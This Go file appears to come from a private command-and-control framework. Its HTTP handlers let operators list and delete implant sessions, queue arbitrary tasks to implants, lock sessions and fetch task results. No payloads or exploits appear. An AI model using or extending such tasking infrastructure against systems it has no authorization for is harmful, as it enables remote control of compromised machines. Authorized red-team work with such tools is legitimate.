package httpapi

import (
	"encoding/json"
	"net/http"
	"strings"

	"github.com/azizbinmohammad/private-c2/server/c2"
	"github.com/azizbinmohammad/private-c2/server/store/models"
	"gorm.io/gorm"
)

type sessionHandler struct {
	implantServer *c2.ImplantServer
	db            *gorm.DB
}

func (sh *sessionHandler) handleSessions(w http.ResponseWriter, r *http.Request) {
	setCORS(w)
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusNoContent)
		return
	}
	if r.URL.Path != "/api/sessions" {
		writeJSON(w, http.StatusNotFound, ErrorResponse{Error: "not found"})
		return
	}
	if r.Method != http.MethodGet {
		writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
		return
	}
	sessions := sh.implantServer.ListSessions()
	writeJSON(w, http.StatusOK, sessions)
}

func (sh *sessionHandler) handleSessionDetail(w http.ResponseWriter, r *http.Request) {
	setCORS(w)
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusNoContent)
		return
	}

	path := strings.TrimPrefix(r.URL.Path, "/api/sessions/")
	parts := strings.SplitN(path, "/", 2)
	sessionID := parts[0]

	if sessionID == "" {
		writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "missing session ID"})
		return
	}

	if len(parts) == 1 {
		switch r.Method {
		case http.MethodGet:
			sess := sh.implantServer.GetSession(sessionID)
			if sess == nil {
				writeJSON(w, http.StatusNotFound, ErrorResponse{Error: "session not found"})
				return
			}
			writeJSON(w, http.StatusOK, sess)
		case http.MethodDelete:
			if err := sh.db.Where("id = ?", sessionID).Delete(&models.Session{}).Error; err != nil {
				writeJSON(w, http.StatusInternalServerError, ErrorResponse{Error: err.Error()})
				return
			}
			writeJSON(w, http.StatusOK, map[string]string{"status": "deleted"})
		default:
			writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
		}
		return
	}

	subpath := parts[1]
	switch subpath {
	case "task":
		if r.Method != http.MethodPost {
			writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
			return
		}
		var req TaskRequest
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "invalid JSON: " + err.Error()})
			return
		}
		if req.Type == "" {
			writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "task type is required"})
			return
		}
		taskID, err := sh.implantServer.QueueTask(sessionID, req.Type, req.Args)
		if err != nil {
			writeJSON(w, http.StatusNotFound, ErrorResponse{Error: err.Error()})
			return
		}
		writeJSON(w, http.StatusCreated, TaskResponse{TaskID: taskID})

	case "lock":
		if r.Method != http.MethodPost {
			writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
			return
		}
		var body struct {
			Operator string `json:"operator"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "invalid JSON"})
			return
		}
		if body.Operator == "" {
			writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "operator is required"})
			return
		}
		res := sh.db.Model(&models.Session{}).Where("id = ?", sessionID).Update("locked_by", body.Operator)
		if res.Error != nil {
			writeJSON(w, http.StatusInternalServerError, ErrorResponse{Error: res.Error.Error()})
			return
		}
		if res.RowsAffected == 0 {
			writeJSON(w, http.StatusNotFound, ErrorResponse{Error: "session not found"})
			return
		}
		writeJSON(w, http.StatusOK, map[string]string{"status": "locked", "locked_by": body.Operator})

	case "unlock":
		if r.Method != http.MethodPost {
			writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
			return
		}
		res := sh.db.Model(&models.Session{}).Where("id = ?", sessionID).Update("locked_by", "")
		if res.Error != nil {
			writeJSON(w, http.StatusInternalServerError, ErrorResponse{Error: res.Error.Error()})
			return
		}
		if res.RowsAffected == 0 {
			writeJSON(w, http.StatusNotFound, ErrorResponse{Error: "session not found"})
			return
		}
		writeJSON(w, http.StatusOK, map[string]string{"status": "unlocked"})

	default:
		writeJSON(w, http.StatusNotFound, ErrorResponse{Error: "not found"})
	}
}

func (sh *sessionHandler) handleTaskResult(w http.ResponseWriter, r *http.Request) {
	setCORS(w)
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusNoContent)
		return
	}
	if r.Method != http.MethodGet {
		writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
		return
	}
	taskID := strings.TrimPrefix(r.URL.Path, "/api/tasks/")
	if taskID == "" {
		writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "missing task ID"})
		return
	}
	result := sh.implantServer.GetResult(taskID)
	if result == nil {
		writeJSON(w, http.StatusOK, PendingResponse{Status: "pending"})
		return
	}
	writeJSON(w, http.StatusOK, result)
}
